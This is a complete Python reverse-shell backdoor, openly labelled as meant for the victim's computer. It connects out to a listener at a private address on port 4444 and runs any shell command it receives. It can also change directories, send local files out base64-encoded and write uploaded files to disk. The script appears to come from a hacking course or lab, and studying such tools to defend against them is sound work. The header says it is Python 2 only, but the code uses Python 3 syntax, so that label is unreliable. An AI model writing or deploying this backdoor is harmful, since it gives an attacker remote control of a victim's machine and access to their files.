#!python2
# NOTICE: this script is intended for the victim's computer.
# Compatibility: Python 2 only. For now.

import base64
import json
import os
import socket
import subprocess


class Backdoor:
    def __init__(self, ip_addr, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip_addr, port))

    def reliable_send(self, data: str):
        if isinstance(data, bytes):
            data = data.decode()
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command_received = self.reliable_receive()
            try:
                if command_received[0] == "exit":
                    command_result = ""
                    self.connection.close()
                    exit()
                elif command_received[0] == "cd" and len(command_received) > 1:
                    command_result = self.change_working_directory(command_received[1])
                elif command_received[0] == "download":
                    command_result = self.read_file(command_received[1])
                elif command_received[0] == "upload":
                    command_result = self.write_file(command_received[1], command_received[2])
                else:
                    command_result = self.execute_system_command(command_received)
            except Exception:  # Note: this is a bad coding practice in most cases.
                command_result = "[-] Error has occurred during command execution."

            self.reliable_send(command_result)


backdoor = Backdoor("10.0.2.15", 4444)
backdoor.run()
